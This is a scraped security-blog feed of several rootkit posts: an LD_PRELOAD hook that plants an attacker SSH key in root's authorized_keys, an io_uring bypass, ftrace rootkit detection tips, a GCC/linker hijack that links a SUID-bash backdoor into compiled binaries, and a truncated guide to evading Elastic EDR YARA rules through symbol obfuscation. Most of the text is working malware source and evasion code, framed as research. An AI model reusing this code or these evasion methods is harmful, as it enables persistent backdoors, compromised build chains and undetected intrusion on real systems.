mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, 